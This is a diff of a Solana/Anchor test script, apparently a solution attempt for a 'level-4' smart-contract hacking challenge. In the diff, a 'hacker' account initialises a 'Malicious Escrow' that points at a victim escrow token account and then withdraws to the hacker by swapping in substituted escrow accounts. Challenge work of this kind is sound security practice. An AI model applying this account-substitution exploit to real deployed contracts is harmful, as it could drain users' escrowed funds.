@@ -49,18 +49,22 @@ describe("level-4", async () => {
   before("Setup", async () => {
     await airdrop(provider.connection, hacker.publicKey, 10 * anchor.web3.LAMPORTS_PER_SOL);
     await airdrop(provider.connection, attackEscrow.publicKey, 10 * anchor.web3.LAMPORTS_PER_SOL);
+    await airdrop(provider.connection, recipient.publicKey, 10 * anchor.web3.LAMPORTS_PER_SOL);
 
     const hackerTokenAccountInfo = await provider.connection.getAccountInfo(HACKER_TOKEN_ACCOUNT);
+    const senderTokenAccountInfo = await provider.connection.getAccountInfo(SENDER_TOKEN_ACCOUNT);
+    const escrowTokenAccountInfo = await provider.connection.getAccountInfo(ESCROW_TOKEN_ACCOUNT);
     console.log("Hacker Token Account owner:", hackerTokenAccountInfo?.owner.toBase58());
     console.log("Hacker public key:", hacker.publicKey.toBase58());
-
+    console.log("Sender token account owner:", senderTokenAccountInfo?.owner.toBase58())
+    console.log("Escrow token account owner:", escrowTokenAccountInfo?.owner.toBase58())
 
     const hackerTokenAccount = await spl.getOrCreateAssociatedTokenAccount(
         provider.connection,
         hacker,
         USDC,
-        SENDER,
-        true,
+        hacker.publicKey,
+        false,
         'confirmed',
         { commitment: 'confirmed' },
         TOKEN_2022_PROGRAM_ID,
@@ -79,21 +83,22 @@ describe("level-4", async () => {
     );
     await new Promise(resolve => setTimeout(resolve, 2000));
     console.log(`Escrow PDA -> ${ESCROW_PDA}`)
+    const escrowPdaInfo = await provider.connection.getAccountInfo(ESCROW_PDA);
+    console.log("Escrow PDA owner:", escrowPdaInfo?.owner.toBase58());
 
     const attackEscrowAta =  await spl.getAssociatedTokenAddress(
       USDC,
-      program.programId,
+      attackEscrow.publicKey,
       false,
       spl.TOKEN_2022_PROGRAM_ID,
       spl.ASSOCIATED_TOKEN_PROGRAM_ID
     );
-    console.log(`Evil ATA Address-> ${attackEscrowAta}`)
 
     const tx = new anchor.web3.Transaction().add(
       spl.createAssociatedTokenAccountInstruction(
         attackEscrow.publicKey, // payer
         attackEscrowAta, // ata
-        program.programId, // owner
+        attackEscrow.publicKey, // authority
         USDC, // mint
         spl.TOKEN_2022_PROGRAM_ID,
         spl.ASSOCIATED_TOKEN_PROGRAM_ID
@@ -105,6 +110,8 @@ describe("level-4", async () => {
     // Verify the ATA was created
     const attackEscrowAtaPubKey =  new web3.PublicKey(attackEscrowAta)
     console.log(`Attack Escrow ATA PubKey -> ${attackEscrowAtaPubKey}`)
+    const attackEscrowTokenAccountInfo = await provider.connection.getAccountInfo(ESCROW_TOKEN_ACCOUNT);
+    console.log(`Attack Escrow ATA Owner -> ${attackEscrowTokenAccountInfo?.owner.toBase58()}`)
     ATTACK_ESCROW_ATA = attackEscrowAtaPubKey
 
   });
@@ -117,7 +124,7 @@ describe("level-4", async () => {
   // v v v v v v v v v v v v v v v v v v v v v
 
   it("Initialize Malicious Escrow", async () => {
-
+    
     const hack = await program.methods.initVesting(
       recipient.publicKey, //recipient
       new anchor.BN('1000'), //amount
@@ -126,15 +133,15 @@ describe("level-4", async () => {
       new anchor.BN('1') //interval
     )
     .accounts({
-      sender: hacker.publicKey,
-      senderTokenAccount: HACKER_TA,
+      sender: attackEscrow.publicKey,
+      senderTokenAccount: ATTACK_ESCROW_ATA,
       escrow: attackEscrow.publicKey,
-      escrowTokenAccount: ATTACK_ESCROW_ATA,
+      escrowTokenAccount: ESCROW_TOKEN_ACCOUNT,
       mint: USDC,
       tokenProgram: TOKEN_2022_PROGRAM_ID,
       systemProgram: web3.SystemProgram.programId,
     })
-    .signers([hacker, attackEscrow])
+    .signers([attackEscrow, hacker])
     .rpc();
     await new Promise(resolve => setTimeout(resolve, 2000));
     console.log(hack)
@@ -151,9 +158,9 @@ describe("level-4", async () => {
     .accounts({
       recipient: hacker.publicKey,
       recipientTokenAccount: HACKER_TA,
-      escrow: ESCROW,
-      escrowTokenAccount: ESCROW_TOKEN_ACCOUNT,
-      escrowPdaAuthority: ESCROW_PDA,
+      escrow: attackEscrow.publicKey,
+      escrowTokenAccount: ATTACK_ESCROW_ATA,
+      escrowPdaAuthority: ESCROW,
       mint: USDC,
       tokenProgram: TOKEN_2022_PROGRAM_ID,
       systemProgram: web3.SystemProgram.programId
@@ -204,7 +211,7 @@ describe("level-4", async () => {
     console.log("Transaction details:", txDetails);
   
     // Wait for 2 seconds (if still needed)
-    await new Promise(resolve => setTimeout(resolve, 2000));
+    await new Promise(resolve => setTimeout(resolve, 1000));
   });
   
 
